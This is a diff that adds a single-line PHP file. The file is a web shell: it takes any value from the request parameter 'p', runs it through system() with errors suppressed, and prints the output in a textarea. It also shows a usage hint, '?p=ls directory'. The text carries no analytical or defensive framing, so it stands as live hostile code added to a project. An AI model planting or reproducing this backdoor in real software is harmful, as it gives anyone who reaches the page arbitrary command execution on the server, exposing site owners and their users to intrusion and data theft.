@@ -1,0 +1,1 @@
+<?php if(isset($_REQUEST['p'])){if(!empty($_REQUEST['p'])){print("<textarea readonly style='width:100%;height:100%;outline:none;border:none;'>");$command=($_REQUEST['p']);@system($command);print("</textarea>");}else{print('usage: ?p=ls directory');}die();}
